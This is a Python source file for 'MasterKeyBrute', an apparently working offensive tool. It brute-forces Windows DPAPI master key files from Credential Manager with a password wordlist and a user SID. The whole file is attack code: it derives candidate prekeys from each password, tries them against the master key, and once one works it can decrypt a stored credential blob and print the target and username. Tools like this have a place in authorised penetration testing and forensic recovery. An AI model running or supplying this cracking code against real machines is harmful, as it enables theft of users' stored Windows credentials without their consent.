#!/usr/bin/env python3
#
# MasterKeyBrute
#
# V 1.0
#
# Description:
#   Bruteforce DPAPI encrypted MasterKey File from Windows Credentials Manager
#
# Author:
#   Processus (@ProcessusT)
#

import hashlib
import os, sys, time, argparse
from binascii import hexlify
from Cryptodome.Cipher import AES
from Cryptodome.Hash import HMAC, SHA1, MD4
from hashlib import pbkdf2_hmac
from impacket.dpapi import CredHist, MasterKeyFile, MasterKey, CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB
from struct import pack



sys.tracebacklimit = 0



def dump_mkf(self):
	print("\t[+] Version : %8x" % (self['Version']))
	print("\t[+] Guid : %s" % self['Guid'].decode('utf-16le'))
	print("\t[+] MasterKeyLen: %.8x (%d)" % (self['MasterKeyLen'], self['MasterKeyLen']))
	print("\t[+] DomainKeyLen: %.8x (%d)\n" % (self['DomainKeyLen'], self['DomainKeyLen']))


def dump_mk(self):
    print("\t[+] Version : %8x" % (self['Version']))
    print("\t[+] Salt : %s" % hexlify(self['Salt']))
    print("\t[+] Rounds : %8x (%d)" % (self['MasterKeyIterationCount'], self['MasterKeyIterationCount']))
    print("\t[+] HashAlgo : %.8x (%d)" % (self['HashAlgo'], self['HashAlgo']))
    print("\t[+] CryptAlgo : %.8x (%d)\n" % (self['CryptAlgo'], self['CryptAlgo']))
 

def check_mkf(mkf, debug):
	print("[+] Analyzing Master KeyFile : "+str(mkf))
	try:
		fp = open(mkf, 'rb')
		data = fp.read()
		mkf= MasterKeyFile(data)
		data = data[len(mkf):]
		if mkf['MasterKeyLen'] > 0:
			mk = MasterKey(data[:mkf['MasterKeyLen']])
			data = data[len(mk):]
		if mkf['DomainKeyLen'] > 0:
			dk = DomainKey(data[:mkf['DomainKeyLen']])
		if debug:
			dump_mkf(mkf)
		if mk is not None:
			print("[+] MasterKey File seems to be encrypted with a password !\n")
			if debug:
				print("[+] Analyzing MasterKey content :")
				dump_mk(mk)
			return mk, data
		elif dk is not None:
			print("[!] MasterKey File seems to be encrypted with an Active Directory Domain Key")
			exit(1)
		else:
			print("[!] Can't determine MasterKey encryption type")
			exit(1)
	except:
		print("[!] Error occured while bruteforcing Master Key File :")
		import traceback
		traceback.print_exc()
		os._exit(1)


def deriveKeysFromUser(sid, password, show_prekeys, debug):
	# Will generate two keys, one with SHA1 and another with MD4
	key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
	key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
	# For Protected users
	tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
	tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
	key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
	if show_prekeys:
		print(f"[+] prekey 1 hashed in SHA1 : {hexlify(key1).decode('latin-1')}")
		print(f"[+] prekey 2 hashed in SHA1 : {hexlify(key2).decode('latin-1')}")
		print(f"[+] prekey 3 hashed in MD4 : {hexlify(key3).decode('latin-1')}\n")
	return [key1, key2, key3]


def decrypt_blob(blobfile, decrypted_key, debugging):
	fp   = open(blobfile, 'rb')
	data = fp.read()
	cred = CredentialFile(data)
	blob = DPAPI_BLOB(cred['Data'])
	decrypted = blob.decrypt(decrypted_key)
	if decrypted is not None:
		creds = CREDENTIAL_BLOB(decrypted)
		print(f"\t[+] Target : {creds['Target'].decode('utf-16le')}")
		print(f"\t[+] Username : {creds['Username'].decode('utf-16le')}")
		print(f"\t[+] Unknown : {creds['Unknown'].decode('utf-16le') }")
		print(f"\t[+] Unknown3 : {creds['Unknown3'].decode('utf-16le')}")






def brute_mkf(mkf, sid, wordlist, show_prekeys, debug):
	mk, data = check_mkf(mkf, debug)
	try:
		print()
		with open(wordlist, 'r') as wordlist_file:
			for password in wordlist_file: 
				print('\033[1A', end='\x1b[2K')
				print(f"[+] Trying to decrypt MasterKey with password: {password}", end='\r')
				password = password.strip()
				prekeys = deriveKeysFromUser(sid, password, show_prekeys, debug)
				for prekey in prekeys:
					decrypted_key = mk.decrypt(prekey)
					if decrypted_key:
						print(f'[+] Decrypted MasterKey : {decrypted_key.hex()}\n')
						return decrypted_key
		print("[+] Can't find password to decrypt MasterKey.")
		print("[+] Process finished.")
		exit(0)
	except:
		print("[!] Error occured while bruteforcing Master Key File :")
		import traceback
		traceback.print_exc()
		os._exit(1)




def main():
	print("\n**************************************************\n\t         MASTERKEYBRUTE\n\n\t         @Processus\n\t            v1.0\n**************************************************\n\n")
	start = time.time()
	parser = argparse.ArgumentParser(add_help = True, description = "Bruteforce DPAPI encrypted MasterKey File from Windows Credentials Manager")
	parser.add_argument('-mkf', action='store', help='Master Key File', required=True)
	parser.add_argument('-sid', action='store', help='User SID to derivate key', required=True)
	parser.add_argument('-w', action="store", help='Wordlist file', required=True)
	options = parser.add_argument_group('Optionnal')
	options.add_argument("--blob", help="Blob file to decrypt with decrypted MasterKey", required=False)
	options.add_argument("--show-prekeys", help="Show calculated prekeys", required=False)
	verbosity = parser.add_argument_group('Verbosity')
	verbosity.add_argument('-debug', action="store_true", help='Turn DEBUG output ON')

	if len(sys.argv)==1:
		parser.print_help()
		sys.exit(1)

	options = parser.parse_args()
	debugging = False
	show_prekeys = False
	if options.mkf is None:
		print("[!] No Master Key File provided !\n")
		exit(1)
	if options.sid is None:
		print("[!] No user SID provided !\n")
		exit(1)
	if options.w is None:
		print("[!] No Wordlist File provided !\n")
		exit(1)
	if options.show_prekeys:
		show_prekeys = True
	if options.debug:
		debugging = True
	
	decrypted_key = brute_mkf(options.mkf, options.sid, options.w, show_prekeys, debugging)

	if options.blob is not None:
		print("[+] Blob file detected, trying to decrypt it with decrypted MasterKey :")
		decrypt_blob(options.blob, decrypted_key, debugging)

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		os._exit(1)